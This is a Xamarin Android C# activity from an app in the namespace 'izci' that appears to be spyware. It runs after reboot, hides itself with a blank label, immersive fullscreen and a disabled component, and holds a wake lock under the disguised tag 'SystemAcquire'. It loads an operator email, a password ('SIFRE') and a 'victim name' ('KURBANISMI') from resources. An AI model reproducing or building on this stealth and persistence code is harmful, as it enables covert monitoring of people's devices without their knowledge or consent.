using System;

using Android.App;
using Android.Content;
using Android.Content.PM;
using Android.OS;
using Android.Views;
using static Android.OS.PowerManager;         //Reboot'dan sonra ihtiyacımız olanları eklediğimiz aktivitemiz.

namespace izci
{
    [Activity(Label = "   ")]
    public class SecondActivity : Activity
    {
        public static Activity aktivity_require = null;
        WakeLock wakelock = default;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            aktivity_require = this;

            Window.AddFlags(WindowManagerFlags.Fullscreen);

            int uiOptions = (int)Window.DecorView.SystemUiVisibility;

            uiOptions |= (int)SystemUiFlags.LowProfile;
            uiOptions |= (int)SystemUiFlags.Fullscreen;
            uiOptions |= (int)SystemUiFlags.HideNavigation;
            uiOptions |= (int)SystemUiFlags.ImmersiveSticky;

            Window.DecorView.SystemUiVisibility =
             (StatusBarVisibility)uiOptions;

            PowerManager pmanager = (PowerManager)GetSystemService("power");
            wakelock = pmanager.NewWakeLock(WakeLockFlags.Partial, "SystemAcquire");
            wakelock.SetReferenceCounted(false);
            wakelock.Acquire();

            MainValues._EMAIL = Resources.GetString(Resource.String.EMAIL);
            MainValues._SIFRE = Resources.GetString(Resource.String.SIFRE);
            MainValues.KRBN_ISMI = Resources.GetString(Resource.String.KURBANISMI);

            try
            {
                PackageManager p = PackageManager;
                ComponentName componentName = new ComponentName(this, Class);
                p.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
            }
            catch (Exception) { }
        }
    }
}